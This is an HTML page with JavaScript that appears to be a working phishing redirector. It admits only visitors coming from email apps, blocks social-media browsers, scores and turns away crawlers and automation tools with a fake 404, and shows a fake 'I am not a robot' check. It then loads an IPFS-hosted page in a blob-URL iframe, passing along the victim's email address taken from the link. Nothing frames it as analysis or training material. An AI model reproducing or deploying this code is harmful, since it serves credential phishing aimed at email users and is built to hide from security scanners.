<!DOCTYPE html>
<html>
<head>
<title>Blob IPFS Redirect + Email Only + Anti-Bot</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
html,body{margin:0;padding:0;width:100%;height:100%;font-family:Arial;overflow:hidden}
#overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#f0f2f5;display:flex;align-items:center;justify-content:center;opacity:0;transition:0.3s;z-index:999999;}
#verificationBox{background:#fff;padding:25px 30px;border-radius:8px;width:300px;box-shadow:0 5px 20px rgba(0,0,0,0.15);border:1px solid #ddd;text-align:left;}
#checkbox{width:26px;height:26px;border:2px solid #7f8fa6;border-radius:4px;cursor:pointer;transition:0.3s;}
#robotIcon{width:32px;height:32px;background:#e8f0fe;border-radius:50%;font-size:20px;display:flex;align-items:center;justify-content:center;animation:botRotate 2s linear infinite;}
@keyframes botRotate{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
#verifying{display:none;margin-top:15px;font-size:14px;color:#555;}
.spinner{width:16px;height:16px;border-radius:50%;border:3px solid #40739e;border-top-color:transparent;animation:spin 0.6s linear infinite;}
@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
.error-404{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#f8f8f8;text-align:center;}
.error-404 h1{font-size:90px;margin:0;}
.error-404 h2{font-size:26px;margin:0;}
.error-404 p{font-size:18px;}
.fullpage-iframe{position:fixed;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;}
</style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div style="display:flex; align-items:center; gap:12px;">
            <div id="robotIcon">ðŸ¤–</div>
            <strong style="flex:1;font-size:15px;">I am not a robot</strong>
            <div id="checkbox"></div>
        </div>
        <div id="verifying">
            <div style="display:flex; align-items:center; gap:5px;">
                <div class="spinner"></div> Verifyingâ€¦
            </div>
        </div>
    </div>
</div>

<script>
/* ------------------------- 404 PAGE ------------------------- */
function show404(message){
    document.body.innerHTML=`<div class="error-404"><h1>404</h1><h2>Error</h2><p>${message||'The requested page could not be found.'}</p></div>`;
}

/* ------------------------- DETECT SOCIAL MEDIA BROWSERS ------------------------- */
function isSocialMediaBrowser(){
    const ua=navigator.userAgent.toLowerCase();
    const social=["instagram","fbav","fban","facebook","tiktok","musical.ly","snapchat","twitter","pinterest","linkedin","reddit","messenger","whatsapp","telegram","wechat"];
    return social.some(x=>ua.includes(x));
}

/* ------------------------- DETECT MOBILE EMAIL REFERRERS ------------------------- */
function isEmailReferrer(){
    const params=new URLSearchParams(window.location.search);
    if(params.get("source")==="email") return true;
    const ref=document.referrer.toLowerCase();
    const emailDomains=["mail.google.com","outlook.com","office.com","mail.yahoo.com","icloud.com","fastmail.com","proton.me"];
    if(!ref || ref.trim()==="") return true; // allow if ref missing (common in mobile email apps)
    return emailDomains.some(x=>ref.includes(x));
}

/* ------------------------- ENFORCE EMAIL ONLY ------------------------- */
function enforceEmailOnly(){
    if(!isEmailReferrer()) return false;
    if(isSocialMediaBrowser()) return false;
    return true;
}

/* ------------------------- ULTRA ANTI-BOT ------------------------- */
async function strongBotCheck(){
    let score=0;
    const ua=navigator.userAgent.toLowerCase();
    const botUA=["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
    if(botUA.some(x=>ua.includes(x))) score+=40;
    if(navigator.webdriver) score+=40;
    try{ const c=document.createElement("canvas"); if(!c.getContext("webgl")) score+=20;}catch{score+=20;}
    try{ const ctx=new (window.AudioContext||window.webkitAudioContext)(); if(ctx.sampleRate<30000) score+=10;}catch{score+=10;}
    if(screen.width<700 || screen.height<500) score+=10;
    let moves=0;
    window.addEventListener("mousemove",()=>moves++);
    window.addEventListener("touchmove",()=>moves++);
    await new Promise(r=>setTimeout(r,700));
    if(moves<3) score+=40;
    return score>=60;
}

/* ------------------------- IPFS REDIRECT ------------------------- */
const BASE_IPFS="https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
function getEmail(){ return new URLSearchParams(location.search).get("email")||""; }
function buildIPFS(email){ return email ? BASE_IPFS+"#"+email : BASE_IPFS; }
function createBlobHTML(url){
    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><style>html,body,iframe{width:100%;height:100%;margin:0;padding:0;overflow:hidden}iframe{position:fixed;top:0;left:0;border:none}</style></head><body><iframe src="${url}" class="fullpage-iframe"></iframe></body></html>`;
}

/* ------------------------- HUMAN CHECK ------------------------- */
function requireVerification(){
    return new Promise(resolve=>{
        const overlay=document.getElementById("overlay");
        const checkbox=document.getElementById("checkbox");
        const verifying=document.getElementById("verifying");
        overlay.style.opacity=1;
        checkbox.onclick=()=>{
            checkbox.style.background="#40739e";
            checkbox.style.borderColor="#40739e";
            verifying.style.display="block";
            setTimeout(()=>{overlay.style.opacity=0; setTimeout(()=>overlay.remove(),300); resolve(true);},900);
        };
    });
}

/* ------------------------- MAIN FLOW ------------------------- */
document.addEventListener("DOMContentLoaded",async()=>{
    if(!enforceEmailOnly()){
        show404("Blocked: Not opened from a valid email app.");
        return;
    }
    if(await strongBotCheck()){
        show404("Blocked: Bot detection triggered.");
        return;
    }
    await requireVerification();
    const email=getEmail();
    const url=buildIPFS(email);
    const blobHTML=createBlobHTML(url);
    const blob=new Blob([blobHTML],{type:"text/html"});
    const blobURL=URL.createObjectURL(blob);
    window.location.href=blobURL;
});
</script>
</body>
</html>
